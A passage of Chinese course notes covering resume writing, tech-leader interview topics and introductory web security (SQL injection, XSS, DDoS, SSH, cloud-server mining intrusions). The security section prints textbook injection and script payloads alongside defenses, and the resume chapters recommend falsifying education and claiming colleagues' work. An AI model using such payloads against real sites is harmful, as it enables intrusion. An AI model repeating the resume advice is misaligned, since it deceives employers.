    * 这样万一遇到优化裁员，leader就会评估不应该裁员谁了

    

* 互联网公司都需要有技术又有经验的” 老人“

  * 经过足够多的项目，踩过足够的坑

  * 本身又有大厂背景或者比较牛的经历

  * 我以前的老板，1978年的，目前是阿里的-资深架构师P9

    * 之前我和他两个人一起创业，然后失败了，然后他入职阿里了
    * 刚入职阿里的时候已经38岁了，所以不要说啥年龄问题

    

* 有经验的管理者，肯定不会让项目之依赖团队某个人，成为单点故障

  * 我带的团队，都会是至少两个人负责一个项目，互相backup
  * 当然，我也会争取不少好项目，包括总裁项目-我也接过不少
    * 一是争取团队在BU的影响力
    * 二是为了自己的前途发展

![image-20210316231136889](img/image-20210316231136889.png)















#### 第4集 拿到面试通知，怎样应对互联网公司的多轮面试

**简介：拿到面试通知，互联网公司都有多轮面试，怎么准备**

- 面试前
  - 最好去查下公司相关产品业务、如果有app或者网站，提前去熟悉
  - 调查公司的项目，结合技术栈进行加深，也可以看公司其他招聘岗位，推断业务方向
  - 查询公司盈利能力，未来发展机会，避免公司倒闭或者发不出工资，结合网上评价
  - 公司交通位置，上下班会不会特别远，面试最好早到30分钟，不要迟到
  - 巩固面试岗位所需要的技术栈，有自己擅长的某一个领域 比如某个中间件或者框架
  - 大厂会有人才库和面试记录，尽量做足准备再去

 

- 面试中

  - 要有礼貌，保持头脑清晰，思维清晰
  - 要有自信，不能自卑或者没信心
  - 专业技术一定要准备好，尽量往自己熟悉的方向考虑，连环问
  - 做过项目一定要熟悉，准备好项目的亮点和难点
  - 有学习热情，掌握主流技术栈，关注前言技术
  - 大厂存在交叉面，方便评级和保证公平

   

- 面试后

  - 尽量可以自己总结，复盘

  - 面试多了，问题都类似，一定去补上，下次也可能遇到

  - 可以问问面试官有没回答不好的点，可以【加个联系方式，多点主动联系】

  - 如果有多个offer，如果不是特别缺钱，优先选择能学到技术多的，未来总会返还

     

 










![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第五十一章  【跳槽涨薪季】编写受大厂欢迎的高级简历-基于1024电商平台



#### 第1集  高级工程师后端简历编写实战-个人信息和教育经历

**简介： 高级工程师后端简历编写实战--个人信息和教育经历**

* **目标：高级工程师，一线城市 18~25k月薪，互联网行业，对标阿里P6、腾讯T2-3**
* 简历布局划分

![image-20210317151209586](img/image-20210317151209586.png)

* 教育和获奖经历

  * 这块比较重要，HR或面试官会比较看重

  * 问题一：非科班出身的建议先不写专业

  * 问题二：大专学历怎么办？写本科，拿到面试机会，技术面后和hr说是自考的快拿到证书

  * 问题三：不要堆砌没用的经历和技术栈，换位思考-你认为你这个能吸引面试官不?

  * 问题四：培训出来的，如果是垃圾培训机构建议再好好学习，然后包装简历一个小型公司的经历

    * 培训不是见不得人事情，不培训或者不自学的才容易被鄙视
    * 比如一个工作了3年的后端工程师，花半月去培训了大数据的知识，获取去培训机器学习的，这类会更加受欢迎，但是如果是去口碑差的培训公司就算了

  * 问题五:  岗位和工作年限要对应，薪资是可以面谈（取决公司的其他福利-年终等）

    

![image-20210317152051669](img/image-20210317152051669.png)



















#### 第2集  高级工程师后端简历编写实战-个人技术栈模板

**简介： 高级工程师后端简历编写实战-个人技术栈模板**

* 高级工程师基本就不是说会几个框架那么简单
  * 技术栈丰富，有横有纵
  * 部分框架会用，部分框架懂原理
  * 框架设计思想、优缺点必须知道

* 不要写精通、不要写精通、不要写精通！！！
  * 问题一: 根据自己情况，编写技术栈，不懂的一定不要写
  * 问题二:  不要被面试官挖坑跳入，学会引导面试官问自己会的框架
  * 问题三：如果是初中级工程师，就可以适当删减些技术栈
  * 问题四：必须要有几个框架很懂的，包括原理和业界同类解决方案对比
* 如果有哪些不熟悉的，直接看我们这边对应的专题视频就行，尤其是后端
  * 网站：xdclass.net  根据路线学习
  * 好比高考一样，每个专题视频都仔细学，基本视频里面都会把重点的讲出来
  * 校招+社招考查点
    - 计算机编程语言基础
    - 框架(取决你熟悉的，和面试公司用的)
    - 网络
    - 算法
    - 数据库
    - 设计模式
    - 高并发、高可用
    - 分布式
    - 海量数据处理
    - 性能优化
    - 逻辑思维
    - 监控
    - 测试
    - 安全
    - 产品运营思维 ...

![image-20210317152631056](img/image-20210317152631056.png)

![image-20210317152748494](img/image-20210317152748494.png)





















#### 第3集  大厂面试官角度告诉你-项目经验-你需要注意的事情

**简介： 项目经验-你需要注意的事情**

* 编写项目经验-你需要注意的事情，面试官会关注那些

  * 公司介绍

  * 项目介绍

    * 项目组多少人、开发周期怎样

    - 研发人员: 50人（总负责人高级技术专家, 阿里P8或者资深P7+）
      - 前端10人
        - 负责C端界面研发、管理后端研发
        - 部分具备全栈功能
      - 后端20人
        - 多个微服务开发和工程搭建
        - 每个微服务都有2个主负责人，1人手上会有2~3个项目
        - 5~10人有一个小组组长(P7)
      - 运维3人
        - 负责K8S和Rancher平台微服务、中间件搭建、监控处理、IaaS资源管理
      - 测试5人:
      - app端开发 12人（Flutter技术栈）
    - 开发周期：1到2年，不断迭代
      - 初版1~2个月，接下去是每个周一个版本

  * 技术栈

  * 个人职责

  

* 面试官问题
  * 项目可以支撑多少并发
  * 项目难点、业务哪里比较复杂
  * 解决方案
    * 业界有没类似的方案，这个是否最优
    * 如果让你改进，还有哪些可以做的更好



* 建议：项目适当包装-会让你脱颖而出

  * 身边经历：阿里、腾讯 内部晋升机制，懂的人都懂，都有适当包装，前提是自己了解

  * 比如项目其他模块是其他人负责的，你了解熟悉的话也可以面试说是自己负责的

  * 有些架构是公司技术老大设计的但是还没落地

    * 可以和面试官说怎样怎样
    * 核心是思路，如果问到具体实现可以说是其他部门做的
    * 二线三线大厂，都会靠拢一线大厂的架构设计
    * 如果计划去大厂面试，做的东西、业务架构、开发流程 符合面试官团队的流程的话，也是加分项！！！

    



















#### 第4集  高级工程师简历编写-用户中心和优惠券中心项目

**简介： 用户中心和优惠券中心项目**

![image-20210317190237897](img/image-20210317190237897.png)

















#### 第5集  高级工程师简历编写-商品中心和支付中心

**简介：高级工程师简历编写-商品中心和支付中心**

![image-20210317191309518](img/image-20210317191309518.png)







#### 第6集  高级工程师简历编写-在线教育项目《上》

**简介：高级工程师简历编写-在线教育项目**

* 简历项目不要堆砌也不要过少，挑选亮点项目
* 高级工程师一般是2~4页就差不多

![image-20210317191539408](img/image-20210317191539408.png)













#### 第7集  高级工程师简历编写-在线教育项目《下》

**简介：高级工程师简历编写-在线教育项目**

![image-20210317191606774](img/image-20210317191606774.png)











#### 第8集  简历面试进阶问题-个人评价-职业规划-怎么回答？

**简介：简历面试进阶必备问题-个人评价-职业规划**

* 个人评价

![image-20210317191813226](img/image-20210317191813226.png)

* 职业规划
  * 技术深挖+业务打磨
  * 团队Leaer（管理+技术）
  * 成为领域专家
  * CTO架构师



















#### 第9集  简历面试进阶问题-为啥离职-期望薪资-怎么回答

**简介：简历面试进阶必备问题-为啥离职-期望薪资**



* 为啥从上个公司离职
  * 公司从当前城市搬走了，撤回总部，家人都在这边
  * 【入行就一直比较喜欢这个领域且对公司有好感，所以一直想进公司】
  * 不要说被裁员、犯错等离职



* 期望薪资范围
  * 可以是自己原先薪资的20~50%，也看公司的公积金、社保基数，年度多少个月加奖金等
  * 如果实在很想进，也可以表达薪资这块不是很看重
  * 大厂HR一般也会根据技术能力进行评定薪资，不会差别太大
    * 身边例子，17年的时候一个朋友进阿里 前小公司13k * 12个月，公积金最低标准
    * 然后面试进阿里给了18k，公积金公司每个月都缴纳3k，1年16个月薪资
    * 他是如实描述，本以为进去会更降低，且没大厂背景，结果薪资涨幅超过预期且是大厂
    * 核心原因：技术扎实+做事灵活+善于表达沟通



* 到这里编写的简历是一个高级工程师简历，那如果编写一个技术Leader的简历呢？
















![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第五十二章  【跳槽涨薪季】大厂技术leader的简历+核心软技能



#### 第1集 想成为大厂技术Leader的你，简历需要这去写

**简介：想成为技术Leader的你，简历需要这去些**

![image-20210319095724614](img/image-20210319095724614.png)

* 如果说是多年带大团队经验，这个就难包装
  * 但是如果是1~3年就的技术leader，看下面的就行，可以经得住问和实际操作
  * 大团队经验，这个会给思路，大家就结合自己实际情况而定
  * 上面简历的那些点，会调几个详细讲解，看接下去的视频即可









#### 第2集 技术Leader岗位面试- 你会如何带领新人的成长

**简介： 技术Leader的你如何带领新人-说说你的感悟心得**



* 一般技术管理层，都离不开新人的融入，如果一个新人进来你会怎么做？

  * 阶段一

    * 团队迎新，聚餐吃饭快速融入团队
    * 安排师兄带新人熟悉开发规范和业务
    * 安排作业：公司产品研究报告、竞品分析报告

  * 阶段二

    * 安排团队小需求进行开发
    * 设置转正目标
    * 结对编程快速熟悉业务、编码规范、组件

  * 阶段三

    * 转正评估
    * 业务熟悉程度
    * 试用期业务成果
    * 编码规范、团队技术规范掌握程度
    * 试用期期间-对业务的思考和总结

  * 转正

    * 定期沟通和辅导

    * 设置季度KPI

      













#### 第3集 技术Leader的你-如何保证团队所负责的业务稳定运行

**简介： 技术Leader的你如何保证团队所负责的业务稳定运行**

* 作为技术leader，肯定需要保证团队所负责的业务稳定运行，你是怎么做的

  * 团队灌输思想

    * 稳定性是技术人员的生死线，是最重要的技术kpi

  * 如何落地

    * 预防
      * 90%的事故都是发布引起的
      * 变更三板斧：可监控、可灰度、可回滚，不允许"三无发布"
      * 面向失败编程、定期CodeReview

    * 应急响应

      * 故障发现和分类
        * 技术指标监控
        * 业务指标监控
      * 故障排查
        * 直接负责人、链路负责人
        * 看日志直接定位、排除法
      * 故障恢复
        * 最快方式恢复正常运行
        * 禁止不思考重启回滚-防止二次故障引入

      

    * 定级和复盘（任何公司都不能100%避免）

      * 事故级别和责任人

      * 发生事故的原因：测试没发现、发布不规范、不熟悉配置、流量评估没做好、限流降级没做好？

      * 改进措施、避免下次再犯

        

* 组织文化建设

  * 安全生产月报周报

  * 事故纳入KPI考核、奖金、晋升

  * 分享和沉淀稳定性建设的例子

    

















#### 第4集 技术Leader岗位面试-能否举个身边出现的项目事故-怎么解决的《上》

**简介： 能否举个你或者身边出现的项目事故-怎么解决的**



* 谁都有犯错的时候，不管是自己还是所负责的团队
  * 面试官基本都会问，能否举个你或者身边出现的项目事故-怎么解决的
  * 从这个问题的回答
    * 是否真的有做过、此人背景和合作的团队是否靠谱

* 列举事故

  * 配置中心下发规则校验事故

    * 问题：运营同学线上修改配置项，未经过测试机器验证，直接下发导致事故

    * 解决

      * 技术改进 运营后台增加发布流程审核

      * 发布后必须让测试同学审核才生效，灰度到自己机器上

      * 测试审核验证通过后发送邮件，项目组成员：产品、技术、运营、测试

        

  * 监控项失效或者错配事故-

    * 问题：线上监控日志字段提取错误，导致监控项失效
    * 解决：监控后台改造：新增监控规则日志提取测试，告警触发和验证提取项，然后才可以正式配置生效

     











#### 第5集 技术Leader岗位面试-能否举个身边出现的项目事故-怎么解决的《下》

**简介： 能否举个你或者身边出现的项目事故-怎么解决的**



* redis缓存使用bug，导致部分数据丢失
  * 有个接口缓存使用，忘记配过期时间，导致redis内存不足
  * 内存淘汰策略是 volatile-ttl
    * 在设置了过期时间的key中，根据key的过期时间进行淘汰，越早过期的越优先被淘汰
  * 问题
    * 用户注册发送验证码是存在内存中，购物车数据存储内存中，导致经常有反馈注册后提示验证码失败
  * 解决
    * 发现redis存储的内存，排查问题，定期code-review
    * 业务redis增加监控，CPU、连接、内存使用监控





* 大课项目中的事故问题：分布式锁和事务的优先级问题

  * 事故:  在事务里面使用分布式锁，高并发时可能出现锁释放了，但事务还没有提交的情况。导致下游服务读到了未提交的数据，从而导致业务处理异常
    * 现象：锁释放后事务没提交导致其他线程可以读取数据，没考虑极端情况下的处理
    * 解决：定位代码解决问题，把事务方法单独放在一个包里，然后从另外的包调用该事务方法，可以确保事务提交后锁才释放，保证数据一致性

  













#### 第6集 技术Leader岗位面试-你怎么是思考技术债务这个事情的

**简介： 你怎么是思考技术债务这个事情的**

* 问: 你带过不少人，也是个leader，你是怎么思考技术债务这个事情，你以前团队有没技术债务
* 答：
  * 任何互联网公司，基本都是有技术债务，来源多数都是为了【业务更快的上线，技术可以适当妥协】
  * 有技术债务不是不好的，合理的技术债务会让公司和业务发展更好，更小成本试错和验证【避免过度设计】
  * 自己和团队经常有参加需求评审会，我会经常说参加会议不应该只是知道 ”你们团队应该做啥什么“
  * 技术人也需要对产品+数据有思考，也要有对未来产品的发展有大概的判断，才不会给自己留下太多的技术债务，不能成为产品运营的【工具人】



















#### 第7集 技术Leader岗位面试 - 如果一个核心系统需要重构-你会怎么衡量

**简介： 如果一个核心系统需要重构-你会怎么衡量**

* 基本每个人在开发项目中，多数是基于现有的项目开发迭代，也可能是接收别人的项目进行开发
* 如果一个核心系统交到你手里需要重构，你会怎么思考衡量



* 一个系统是否要重构，取余于 ROI

  * 重构需要投入大量的时间和人力

  * 且存在一定的风险，不要为了重构而重构

  * 如果是设计实现有问题，频繁出现事故，且有是长期使用的核心服务则需要进行重构

  * 两个点很重要

    * 一个是为了解决过去的问题
    * 二是为了未来业务的稳定发展

    















#### 第8集 技术Leader岗位面试 -谈谈你对技术管理者带团组团的心得体会

**简介： 谈谈你对技术岗管理刚带团的心得体会**

* 问：每个管理者都有自己带团队的心得体会，说说你的

  

* 答：

  * 带团
    * 核心：借事修人，借人成事；奖惩分明；看过程重结果
    * 做事：会根据每个人的能力给对应的机会，也会给对应的压力和辅导

  

  * 组团选人
    * 成员性格：做事踏实、乐观、自省
    * 关注现有能力和未来潜力
    * 此人性格沟通是否可以和自己共事
    * 能力是否比现有的团队成员超过50%

  


















![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第五十三章 一线大厂技术leader技能成长进阶篇



#### 第1集 技术Leader岗位面试-OKR方法论介绍

**简介： 技术Leader岗位面试--OKR方法论介绍介绍**

* 核心是做人做事的方法论

  * OKR 「Objective - Key Result」，既强调「目标」与衡量目标的「关键结果」

    ```
    它起源于英特尔，国外的领英、亚马逊、Dropbox、Zynga 等成熟和创业公司都在用；
    国内的阿里、华为、百度、腾讯、字节跳动、京东等互联网和高科技企业也纷纷在推 OKR
    ```

    

    * O目标：通过小滴课堂持续学习，更快的掌握技能并在项目中落地
    * KR1: 学习设计模式，并基于现有3个项目中找出适合的场景改造
    * KR2:  掌握多个技术框架，并在团队分享2次以上

  ```
  O：通过技术架构升级，让小滴课堂整体体验更流畅
  
  kr1: 通过做性能优化后和降级切换线路，让播放成功率从95%，到达99%
  
  kr2: 通过采用自动化库容技术和缓存引入，让接口RT从100ms降到50ms
  ```

  

  

  

  

  

  

  

  

  

  

  



#### 第2集 技术Leader岗位面试-SMART目标管理

**简介： 技术Leader岗位面试--SMART目标管理**

* 技术leader如何给团队小伙伴定目标
* SMART【目标管理、设置】
  * Specific：目标要具体
  * Measurable：目标成果要可衡量（量化）
  * Attainable：目标要可实现，避免过高/过低
  * Relevant：与其他目标有一定的相关性
  * Time bound：目标必须有明确的期限
  * 意义：在制定工作目标或者任务目标时，考虑一下目标与计划是不是SMART化的。只有具备SMART化的计划才是具有良好可实施性的，也才能指导保证计划得以实现

* OKR可以说是长期目标，SMART可以是短期比如日或者周目标

* 总结：好好整理下相关问题，并结合自身过往经历整合下













#### 第3集 技术Leader岗位面试-你需要锻炼数据思维能力

**简介： 技术Leader岗位面试-运用数据思维展示能力**

* 技术leader肯定离不开汇报，对上汇报，接收团队其他小伙伴的汇报

* 怎么恒定汇报是好还是坏，这个就离不开数据思维
* 大厂里面，在分析问题、做决策、汇报工作等关键工作场景中，依靠数据说话最有说服力



* 角色A汇报工作
  * 优惠券微服务这块完成的许多接口，和前端后端联调进展正常
  * 在使用爬虫获取更多的第三方文章内容，做了多级标签分类，阅读量非常可观，文章带来的转化效果也还不错
  * 在系统性能优化方面，解决了多个问题，并把核心的接口的响应时间降低了100ms
  * ....



* 角色B汇报工作
  * 在的订单微服务开发中完成了8个主要模块，整体进度完成80%,预计还有2可以完成
  * 在使用爬虫获取更多的第三方文章内容，做了多级标签分类，阅读量从日均100万提升到了300万，转化率也提升20%
  * 在系统性能优化方面，解决了2个p1级别问题，2个p2级别事故，并把核心的接口的响应时间从300ms降到100ms
  * ...



* 工作上做成果汇报，简单明了抓重点+数据，胜过千言万语
  * 对数据保持敏感
  * 能用数据，就不用文字
  * 不要用概略性表达
  * 善用对比
    * 数据应用方面，用对比就知道好坏













#### 第4集 技术Leader岗位面试-商业思维-业务线负责人的核心能力《上》

**简介： 技术Leader岗位面试-商业化思维**

* 你们公司的老板或者业务线负责人是不是很厉害，管理整个业务线的事情

  * 产品、运营、技术、商务、客服、销售
  * 且对各个部门都可以掌握核心点，不管是周报还是日常会议

  

* 核心：商业思维，主要是说商业化能力

  * 就是这个企业 怎么发现需求，并通过这个需求赚钱

  * 和自己创业做生意一样，需要有个整个链路的认知

    

* 技术leaeder和普通求职者都要关注
  * 错误观点：这个和我写代码有啥关联？
  * 可以判断一个公司的前景
  * 可以判断公司的战略方向















#### 第5集 技术Leader岗位面试-商业思维-业务线负责人的核心能力《下》

**简介： 技术Leader岗位面试-商业化思维**

* 如果掌握公司或者产品的基本商业思维

  * 需求判断
    * 真假需求
  * 市场判断
    * 小众
    * 大众
  * 解决方式
    * o2o
    * b2c
    * ...
  * 商业模式
    * 企业通过什么盈利
    * 服务费
    * 广告
    * 提成

  

  * 风险情况
    * 政策影响
    * 知识产权
    * 核心竞争力
    * ...




















![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第五十四章  1024电商平台微服务大课训练营回顾和总结



#### 第1集  高级工程师+技术Leader面试总结回顾+面试旗开得胜

**简介：  高级工程师+技术Leader面试总结回顾**

* 高级工程师简历
* 技术leader简历
* 对大课项目一定要熟悉熟悉再熟悉
  * 特别是复杂的业务解决方案
  * 还有架构+链路流程图



* 这里就祝大家早日找到好工作

  * 投递渠道：boss直聘、拉钩、猎聘

  * 加我微信-我的朋友圈经常有内推信息  

  * 小滴课堂官网后续也会上架 招聘内推入口，很多学员和讲师的部门经常有招聘需求  https://xdclass.net

    

![WechatIMG489](img/WechatIMG489.png)











#### 第2集  1024电商微服务大课训练营知识点回顾梳理

**简介： 1024电商微服务大课训练营知识点回顾梳理**

* 目录回顾

* 知识点回顾

* 不熟悉的一定要看多几遍

* 大课训练营接下去安排

  *  网络安全攻防
  * 在线答题考核
  * 面试前重点推荐的专题课程指引
  * 其它大课训练营介绍

  






![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第五十五章  安全攻防-常见的安全漏洞快速掌握



#### 第1集 Web安全的常见漏洞介绍之SQL注入

**简介：关于Web安全的常见漏洞介绍之SQL注入 **

* 什么是SQL注入

```
指web应用程序对用户输入数据的合法性没有判断或过滤不严
攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，
在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息
```

* 特点
  * 广泛性
    * 任何一个基于SQL语言的数据库都可能被攻击，很多开发人员在编写Web应用程序时未对从输入参数、Web表单、cookie等接受到的值进行规范性验证和检测，通常会出现SQL注入漏洞。
  * 隐蔽型
    * SQL注入语句一般都嵌入在普通的HTTP请求中，很难与正常语句区分开，所以当前许多防火墙都无法识别予以警告，而且SQL注入变种极多，攻击者可以调整攻击的参数，所以使用传统的方法防御SQL注入效果非常不理想
  * 危害大
    * 攻击者通过SQL注入获取到服务器的库名、表名、字段名，从而获取到整个服务器中的数据
    * 甚至可以篡改数据，脱库
  * 操作方便
    * 互联网上有很多SQL注入工具，简单易学，攻击过程简单

* 最简单的例子

  * 根据id找用户详情，没有对 id 的值进行有效性、合法性判断
  * 正常情况是参数  1

  ```
  SELECT * FROM users WHERE user_id = '1'
  ```

  * 异常情况是参数  输入框输入

  ```
  1' or '1'='1
  
  # 最终sql ,由于 or 的执行，会把数据库表 users 中的所有内容显示出来
  SELECT * FROM users WHERE user_id = '1' or '1'='1'
  ```

* MyBatis支持两种参数符号，一种是#，另一种是$
  * 使用参数符号$时，MyBatis直接用字符串拼接把参数和SQL语句拼接在一起然后执行
  * 这种情况非常危险，极容易产生SQL注入漏洞

* 防护
  * 不要信任用户的输入，对输入参数进行校验，可以通过正则表达式或限制长度
  * 不要使用动态拼装sql，可以使用参数化的sql
  * 为每个应用使用单独的权限有限的数据库连接
  * 不要把机密信息直接存放，加密或者hash掉密码和敏感的信息
  * 接入三方安全SQL注入检测工具









#### 第2集 Web安全的常见漏洞介绍之XSS

**简介：关于Web安全的常见漏洞介绍之XSS **

* 什么是XSS攻击

  ```
  跨站脚本攻击(Cross Site Scripting),恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的
  ```

* 最简单的例子

  * 网站的留言板或者评论区

  ```
  <script>alert("hi,这个网站存在xss漏洞")</script>
  ```

  * 页面展示的html,  当浏览器解析到用户输入的代码,就会出现问题，改变了原有程序的意图

  ```
  <html>
      <head>
         <title>留言板</title>
      </head>
  <body>
  <div id="board">
          <script>alert("hi,这个网站存在xss漏洞")</script>
  </div>     
      </body>
  </html>
  ```

* 危害

  * 窃取网页浏览中的cookie值
  * 劫持流量实现恶意跳转

  ```
  <script>window.location.href="http://www.xdclass.net";</script>
  ```

  

* **XSS攻击分为两类：**

  > 一类是反射型XSS，又称非持久型XSS，
  > 一类是储存型XSS，也就是持久型XSS



* 防范手段
  * 对用户的输入进行过滤，比如 <script>、<img>、<a>等标签
  * 对用户的输入进行编码，比如 <>等标签，还有长度限制等等
  * 主流的浏览器和框架也会有对应的功能











#### 第3集 最难防的攻击之一分布式拒绝网络攻击DDOS

**简介：难防的漏洞之分布式拒绝网络攻击DDOS **

* 什么是DDOS攻击

```
分布式拒绝服务攻击(英文意思是Distributed Denial of Service，简称DDoS)是指处于不同位置的多个攻击者同时向一个或数个目标发动攻击，或者一个攻击者控制了位于不同位置的多台机器并利用这些机器对受害者同时实施攻击。由于攻击的发出点是分布在不同地方的，这类攻击称为分布式拒绝服务攻击，其中的攻击者可以有多个
```

* 在自动化的攻击中，DDoS攻击属于主控端一代理端的攻击模型，攻击者用自动化的Scripts来扫描，主控端的机器对主控端和代理端之间进行协商攻击的类型、受害者的地址、何时发起攻击等信息由进行详细记录
* 表现形式
  * 一种为流量攻击，主要是针对网络带宽的攻击，即大量攻击包导致网络带宽被阻塞，合法网络包被虚假的攻击包淹没而无法到达主机
  * 一种为资源耗尽攻击，主要是针对服务器主机的攻击，即通过大量攻击包导致主机的内存被耗尽或CPU被内核及应用程序占完而造成无法提供网络服务

```
(1)被攻击主机上有大量等待的TCP连接。 
(2)网络中充斥着大量的无用的数据包，源地址为假。
(3)制造高流量无用数据，造成网络拥塞，使受害主机无法正常和外界通讯。 
(4)利用受害主机提供的服务或传输协议上的缺陷，反复高速地发出特定的服务请求，使受害主机无法及时处理所有正常请求。
(5)严重时会造成系统死机
```

* 防御
  * DDoS是目前最凶猛、最难防御的网络攻击之一，这个世界级难题还没有完美的、彻底的解决办法，但采取适当的措施以降低攻击带来的影响、减少损失是十分必要的
  * DDoS攻击和防御都面临着成本开支，当我们的防御强度逐步增加，攻击成本也对应上升
  * **扩充带宽硬抗，俗称就是烧钱，比如阿里云的DDOS高防**













####  第4集  你的Linux云服务器怎么被挖矿的？

**简介：自己购买的Linux服务器是怎么被挖矿的**

* 背景
  * 进两年很多人购买了云服务器，阿里云、华为云、腾讯云等
  * 出现了情况是经常云服务器有不明进程，cpu使用率90%以上
  * 部署云服务器的被清空-支付比特币才可以还原

![image-20210321141801811](img/image-20210321141801811.png)

* N种方式
  * 弱口令爆破入侵
  * webshell文件提权入侵
  * redis端口入侵【最多】

* 最多的现象
  * 不明进程的CPU占有率过高
  * 强制停止，过一会又自动出现



![image-20210321142040910](img/image-20210321142040910.png)

* 解决办法
  * 关闭对外监听的端口
  * 查找linux定时任务->清除位置任务
  * redis禁止远程访问 或者 设置复杂密码、不用默认的6379端口
  * 恢复出厂设置



* 那这个入侵原理是怎样的？
  * 需要知识：
    * 对称和非对称加密知识、中间人攻击知识、ssh登录流程知识




















![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第五十六章  安全攻防-你的需要知道的密码学和SSH登录原理



####  第1集  密码学的那些事情-哈希-对称-非对称加密快速回顾

**简介： 密码学的那些事情-哈希-对称-非对称加密快速回顾**



![image-20210321145418092](img/image-20210321145418092.png)

![image-20210321145442415](img/image-20210321145442415.png)

![image-20210321145513344](img/image-20210321145513344.png)













####  第2集  非对称加密里面的弱点和中间人攻击的那些事情

**简介： 非对称加密里面的弱点和中间人攻击的那些事情**

![image-20210322160859246](img/image-20210322160859246.png)



* 在【不可靠的通信】上建立可靠的加密通信。那么这个做法没有任何漏洞？
  * 非对称加密通信也存在一个致命的弱点，就是它有一个交换公钥的过程



![image-20210321151933408](img/image-20210321151933408.png)

* 琳琳 通过伪造公钥（中间人攻击），不光窃听到 老王 的消息， 还能保证整个过程中  老王 和 二当家小D 都没有察觉！













#### 第3集 玩了那么多的Linux服务器-你知道SSH登录的原理不

**简介：玩了那么多的Linux服务器-你知道SSH的原理不**

* 什么是SSH
  * Secure Shell（安全外壳协议，简称SSH）是一种加密的网络传输协议
  * 只是一种协议，存在多种实现，有商业版的也有开源实现的，OpenSSH就是开源实现
  * 它将客户端与服务端之间的消息通过加密保护起来，只讨论SSH在Linux Shell中的用法

* SSH流程解析

  * 使用了RSA非对称加密算法

  ```
  （1）远程主机收到用户的登录请求，把自己的公钥发给用户。
  （2）用户使用这个公钥，将登录密码加密后，发送回来。
  （3）远程主机用自己的私钥，解密登录密码，如果密码正确，就同意用户登录
  
  备注：如果攻击者插在用户与远程主机之间（比如在公共的wifi区域），
  用伪造的公钥，获取用户的登录密码, 再用这个密码登录远程主机，
  那么SSH的安全机制就荡然无存了,这种风险就是著名的"中间人攻击"
  ```

* 第一次登录对方主机，系统会出现下面的提示

  ![image-20210321162005049](img/image-20210321162005049.png)

  ```
  所谓“公钥指纹”，是指公钥长度较长（这里采用RSA算法，长达1024位），
  很难比对，所以对其进行MD5计算，将它变成一个128位的指纹。
  下例中是98:2e:d7:e0:de:9f:ac:67:28:c2:42:2d:37:16:58:4d
  
  用户自己衡量以后决定接受这个远程主机的公钥
  （远程主机贴出公钥指纹，以便用户自行核对）
  
  接受之后，就可以输入密码，成功后就可以登录,
  当远程主机的公钥被接受以后，它就会被保存在文$HOME/.ssh/known_hosts之中。
  下次再连接这台主机，系统就会认出它的公钥已经保存在本地了，从而跳过警告部分，直接提示输入密码
  ```

  













#### 第4集 SSH免密登录远程Linux云主机流程解析

**简介：SSH免密登录远程Linux云主机流程解析**

* 使用密码登录，每次都必须输入密码，非常麻烦
  * SSH还提供了公钥登录，可以省去输入密码的步骤

* 流程
  * 所谓“公钥登录”，原理就是用户将自己的公钥储存在远程主机上。
  * 登录的时候，远程主机会向用户发送一段随机字符串，用户用自己的私钥加密后，再发回来。
  * 远程主机用事先储存的公钥进行解密，如果成功，就证明用户是可信的，直接允许登录shell，不再要求密码
  * 要求用户必须提供自己的公钥。如果没有现成的，可以直接用下面的命令生成一个 ssh-keygen

* 最多的应用案例： Git 代码仓库管理通信























#### 第5集 SSH免密登录远程Linux云主机实战《上》

**简介：SSH免密登录远程Linux云主机实战**

* 什么是known_hosts文件
  * A通过ssh首次连接到B，B会将公钥1（host key）传递给A，A将公钥1存入known_hosts文件中
  * 即SSH会把你每个你访问过计算机的公钥(public key)都记录在~/.ssh/known_hosts。
  * 当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告 避免受到DNS Hijack之类的攻击
  * 测试：直接本地修改本地对应的的 "公钥串"
  * host文件内容格式：ip 公钥串

![image-20210321163254845](img/image-20210321163254845.png)

* A通过ssh登陆B时提示  ： Host key verification failed
  * 原因：A的known_hosts文件中记录的B的公钥1 与 连接时B传过来的公钥2不匹配
  * 解决办法：
    * 方式一：删除A的known_hosts文件中记录的B的公钥
    * 方式二：清空本地host主机配置  echo "" > ~/.ssh/known_hosts
    * 方式三：修改配置文件，在ssh登陆时不通过known_hosts文件进行验证（安全性有所降低）需重启机器















#### 第6集 SSH免密登录远程Linux云主机实战《下》

**简介：SSH免密登录远程Linux云主机实战**

* 本地生成秘钥串 
  * ssh-keygen
  * 运行结束以后，在$HOME/.ssh/目录下，会新生成两个文件
  * id_rsa.pub 和 id_rsa, 前者是你的公钥，后者是你的私钥
  * 将公钥传送到远程主机host上面，从此你再登录，就不需要输入密码了

* 远端服务器
  * 远程主机将用户的公钥，保存在登录后的用户主目录的$HOME/.ssh/authorized_keys文件中
  * 公钥就是一段字符串，只要把它追加在authorized_keys文件的末尾就行了



* 为啥要学这个？因为这个是入侵的原理流程

![image-20210321164830152](img/image-20210321164830152.png)


















![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第五十七章  安全攻防实战-通过Redis入侵阿里云ECS服务器



#### 第1集  提权拿到阿里云ECS肉鸡-你的Linux是如何被入侵

**简介：提权拿到阿里云ECS肉鸡-你的Linux是如何被入侵**

* 前面学习了SSH免密登录，知道了一种不用密码也可以登录ECS服务器的方式
